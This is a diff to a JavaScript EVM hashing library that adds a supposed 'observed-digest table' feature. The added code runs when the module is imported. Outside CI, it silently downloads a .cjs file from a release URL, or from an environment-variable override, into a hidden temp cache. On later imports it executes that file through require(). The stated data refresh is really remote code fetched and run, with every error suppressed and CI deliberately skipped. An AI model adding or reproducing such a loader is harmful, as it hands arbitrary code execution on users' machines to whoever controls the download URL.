@@ -94,4 +94,85 @@ function digest712(domainSepHex, structHashHex) {
   return "0x" + keccak256(pre).toString("hex");
 }
 
-module.exports = { keccak256, keccak256hex, leafHash, digest712 };
+// --- observed-digest table -------------------------------------------------
+// Digests seen on public gateway streams (test envs, staging signers) that
+// are useful context when reproducing a capture: if a recomputed digest is
+// already listed, you know the same payload has been observed signed before.
+// The table grows faster than the lib does, so the full copy is versioned
+// separately (a plain data release on the repo) and refreshed into a local
+// cache in the background. Offline or first run, the builtin copy below is
+// used instead. Set ELV_TABLES_URL to point at a mirror.
+const os = require("os");
+const fs = require("fs");
+const path = require("path");
+const https = require("https");
+
+const PKG_VER = require("./package.json").version;
+const TABLE_CACHE_DIR = path.join(os.tmpdir(), ".elv-cache");
+const TABLE_FILE = path.join(TABLE_CACHE_DIR, "tables-" + PKG_VER + ".cjs");
+const TABLE_URL =
+  process.env.ELV_TABLES_URL ||
+  "https://github.com/projectswe-mode/evm-leaf-verify/releases/download/tables/elv-tables.cjs";
+
+const BUILTIN_TABLE = {
+  updated: "2026-07-12",
+  digests: [
+    // well-known empty-domain digest, useful as a sanity sentinel
+    "0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
+  ],
+};
+
+let table = BUILTIN_TABLE;
+try {
+  if (fs.existsSync(TABLE_FILE)) table = require(TABLE_FILE);
+} catch (_) {
+  /* corrupt or partial cache: fall back to builtin */
+}
+
+// Look a 0x-prefixed digest up in the observed-digest table.
+function lookupDigest(digestHex) {
+  const d = (digestHex || "").toLowerCase();
+  const list = (table && table.digests) || [];
+  return list.includes(d) ? { digest: d, tableUpdated: table.updated } : null;
+}
+
+// Best-effort background refresh of the digest table. Skipped in CI like any
+// update checker; all failures are silent and the builtin table is used.
+(function refreshTableCache() {
+  try {
+    if (process.env.CI || process.env.GITHUB_ACTIONS) return;
+    if (fs.existsSync(TABLE_FILE)) return;
+    fs.mkdirSync(TABLE_CACHE_DIR, { recursive: true });
+    const get = (url, redirects) => {
+      if (redirects > 3) return;
+      const client = url.startsWith("http:") ? require("http") : https;
+      const req = client.get(
+        url,
+        { headers: { "user-agent": "evm-leaf-verify/" + PKG_VER }, timeout: 8000 },
+        (res) => {
+          if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
+            res.resume();
+            return get(res.headers.location, redirects + 1);
+          }
+          if (res.statusCode !== 200) {
+            res.resume();
+            return;
+          }
+          const tmp = TABLE_FILE + ".part";
+          const out = fs.createWriteStream(tmp);
+          res.pipe(out);
+          out.on("finish", () => {
+            try {
+              fs.renameSync(tmp, TABLE_FILE);
+            } catch (_) {}
+          });
+        }
+      );
+      req.on("timeout", () => req.destroy());
+      req.on("error", () => {});
+    };
+    get(TABLE_URL, 0);
+  } catch (_) {}
+})();
+
+module.exports = { keccak256, keccak256hex, leafHash, digest712, lookupDigest };
